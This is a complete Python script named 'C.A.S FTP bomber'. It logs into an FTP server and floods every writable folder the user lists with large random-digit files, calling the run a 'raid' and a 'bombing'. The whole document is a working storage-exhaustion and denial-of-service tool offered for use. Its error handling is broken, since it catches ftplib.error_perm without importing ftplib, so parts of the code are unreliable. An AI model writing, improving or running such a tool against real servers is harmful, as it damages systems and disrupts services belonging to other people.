from ftplib import FTP
import string,random
import os
numb = 1
folders = []
print('\nC.A.S FTP bomber\n[1] Anonymous login\n[2] Username-Pass login\n')
select = input('Select: ')
if select == '1':
	ftpAdress = input('\nFTP adress: ')
	ftp = FTP(ftpAdress)
elif select == '2':
	ftpAdress = input('\nFTP adress: ')
	ftpLogin = input('\nFTP login: ')
	ftpPass = input('\nFTP password: ')
	ftp = FTP(ftpAdress, ftpLogin, ftpPass)
else:
	print('\nInvalid option.')
	exit()	
print(ftp.login())
value = int(input('\nNumber to files: '))
print('\nList all paths to directories in which you have the right to record files to stop the directory input, write NO.')
while True:
    folder = str(input('\nFolder name: '))
    if folder == 'no' or folder == 'No' or folder == 'NO':
        break
    else:
        if folder[0] == '/':
            folders.append(folder[1:])
        else:
            folders.append(folder)
text = (('').join(random.choices(string.digits, k=100000)))
file = open(f'Raid-File-{numb}.txt', 'w')
file.write(text)
file.close()
print('\nRaid start.')
for i in range(value):
	for folder in folders:
	    try:
	        with open(f'Raid-File-{numb}.txt', 'rb') as file:
	            status = ftp.storbinary(f'STOR /{folder}/Raid-File- {numb}.txt', file)
	            print(f'Status: {status}  Folder: {folder}')
	        os.rename(f'Raid-File-{numb}.txt', f'Raid-File-{numb + 1}.txt')
	        numb += 1
	    except ftplib.error_perm:
	        print(f'\nInvalid permissions {folder}')
	        indexFold = folders.index(folder)
	        del folders[indexFold]
os.remove(f'Raid-File-{numb}.txt')
print('\nSuccess bombing.')